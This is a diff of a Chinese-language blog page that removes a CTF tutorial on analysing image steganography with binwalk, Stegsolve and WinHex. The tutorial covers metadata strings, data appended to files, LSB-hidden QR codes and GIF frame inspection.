-<h2 id="0x02-准备的工具"><a href="#0x02-准备的工具" class="headerlink" title="0x02 准备的工具"></a>0x02 准备的工具</h2><ul>
-<li>Notepad++，功能比 Windows 中的 Notepad(记事本)强大，除了可以用来制作一般的纯文字说明文件，也十分适合编写计算机程序代码。不仅有语法高亮度显示，也有语法折叠功能，并且支持宏以及扩充基本功能的外挂模组。主要是用来方便的查找一些东西。</li>
-<li>binwalk，kali下的一个自动化分析图片隐藏文件的软件。用来自动分析图片隐藏信息及其所在位置。</li>
-<li>Stegsolve，一款图片通道查看器。做LSB分析，图片比较什么的。</li>
-<li>Winhex，16进制查看器。用通过分析2进制数据来看隐藏了什么，同时可以用来分离文件。</li>
-<li>Photoshop，三大邪教之一。看看有没有隐藏的图层什么的。</li>
-<li>Exif查看器，可以查看拍摄时的光圈、快门、白平衡、ISO、焦距、日期时间等各种和拍摄条件以及相机品牌、型号、色彩编码、拍摄时录制的声音以及GPS全球定位系统数据、缩略图等。  </li>
-</ul>
-<p>对于不想装linux系统，真的想在windows下安装binwalk的，也可以，先确保windows中有git环境和python环境，然后在git中输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/devttys0/binwalk</span><br><span class="line">cd binwalk</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure></p>
-<p>Binwalk具体用法在wiki里面，没有git环境的在github项目里直接下载binwalk</p>
-<p>  github项目：<a href="https://github.com/devttys0/binwalk" target="_blank" rel="noopener">https://github.com/devttys0/binwalk</a></p>
-<p>  binwalk的wiki：<a href="https://github.com/devttys0/binwalk/wiki" target="_blank" rel="noopener">https://github.com/devttys0/binwalk/wiki</a></p>
-<h2 id="0x03-类型1"><a href="#0x03-类型1" class="headerlink" title="0x03 类型1"></a>0x03 类型1</h2><p>用载体进行隐藏，查看一下属性，看看里面有没有什么信息，或者直接用notepad++打开，一般ctrl+f查找一下key，flag等信息，如果没找到，可以翻到图片头或者尾部查看是否有特殊的字符串，比如一段md5、base64、unicode之类的，然后到某些网址进行解密。</p>
-<p>通过备注查看：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/1.0.png" alt=""><br>通过notepad++查看：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/1.1.png" alt=""><br>在线解密：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/1.2.png" alt=""></p>
-<h2 id="0x04-类型2"><a href="#0x04-类型2" class="headerlink" title="0x04 类型2"></a>0x04 类型2</h2><p>图片文件会自动忽略结束符之后的数据，比如jpg图片的结束符为FF D9,在这之后加入数据，不会影响jpg的显示，对于类隐写，我们肯定用不能winhex打开16进制数据肉眼去看，这个时候就要用到binwalk了，例子如下，放在linux里，用binwalk xxx.jpg自动跑出来隐藏的信息及其类型。这个时候我们借助winhex设置头和尾然后导出成新文件，或者直接在linux系统中用dd命令，都是可以分割出来后面一段文件的。</p>
-<p>  使用binwalk分析：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/2.1.png" alt=""><br>  在linux下用dd命令分离（方法一）：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/2.2.png" alt=""><br>  在win下用winhex分离（方法二）：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/2.3.png" alt=""><br>  分离出来的结果：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/2.4.png" alt=""></p>
-<h2 id="0x05-类型3"><a href="#0x05-类型3" class="headerlink" title="0x05 类型3"></a>0x05 类型3</h2><p>LSB隐写，也就是最低有效位 (Least Significant Bit)。图片中的像数一般是由三种颜色组成，即三原色，由这三种原色可以组成其他各种颜色，例如在PNG图片的储存中，每个颜色会有8bit，LSB隐写就是修改了像数中的最低的1bit。<br>这里需要注意一个坑，很多时候它会给你一个黑白颜色相反的二维码，直接扫肯定是出不来结果的，需要自己处理一下，最简单的就是放到一个可以编辑的地方ctrl+a一下，然后扫描。</p>
-<p>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/3.1.png" alt=""><br>使用Stegsolve发现他在灰色最低位隐藏了一个二维码：<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/3.2.png" alt=""></p>
-<h2 id="0x06-类型4"><a href="#0x06-类型4" class="headerlink" title="0x06 类型4"></a>0x06 类型4</h2><p>Gif，这种题喜欢让密码出现的特别快来不及记录，这个时候丢到Stegsolve-frame browser，一帧一帧的看就行了<br>逐帧查看：  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/4.1.png" alt="">  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/4.2.png" alt="">  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/ctf-yx/4.3.png" alt=""></p>
-<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>关于图片隐写的还有很多，png格式的文件经常会在一个不完整的版块藏很多数据，这个时候可以用pngcheck分析，有时候会跑出来两张看起来相同的png图片，可以丢到Stegsolve-image combiner中对比，bmp文件经常会在不同图层隐藏信息，photoshop就可以处理。例子中用到的图都放在github中了，有兴趣的朋友可以去试试。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2267,7 +2272,7 @@ main()
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">106</span>
+                <span class="site-state-item-count">108</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
